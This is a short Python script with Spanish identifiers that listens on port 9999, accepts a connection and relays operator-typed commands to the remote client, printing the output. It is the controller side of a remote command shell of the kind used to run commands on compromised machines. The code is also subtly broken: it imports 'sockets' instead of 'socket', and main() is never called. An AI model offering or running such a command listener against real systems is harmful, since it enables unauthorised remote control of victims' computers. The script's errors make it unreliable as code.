import sockets
import sys

#crear socket
def crear_socket():
	try:
		global host
		global puerto
		global s
		host = ''
		puerto = 9999
		s = socket.socket()
	except socket.error as mensaje:
		print('Error en la creacion del socket' + str(mensaje))


def unir_socket():
	try:
		global host
		global puerto
		global s
		print("Uniendo el socket al puerto " + str(puerto))
		s.bind((host,puerto))
		s.listen(5)
	except socket.error as mensaje:
		print('Error en la union del socket' + str(mensaje))
		print('Reintentando . . .')
		unir_socket()

def aceptar_socket():
	conexion, direccion = s.accept()
	print("Conexion establecida | "+" IP " + direccion[0] + "| PUERTO " + str(direccion[1]))
	mandar_comandos(conexion)
	conexion.close()

def mandar_comandos(conexion):
	while True:
		cmd = input()
		if cmd == 'salir':
			conexion.close()
			s.close()
			sys.exit()
		if len(str.encode(cmd)) > 0:
			conexion.send(str.encode(cmd))
			respuesta_cliente = str(conexion.recv(1024),"utf-8")
			print(respuesta_cliente,end = "")


def main():
	crear_socket()
	unir_socket()
	aceptar_socket()
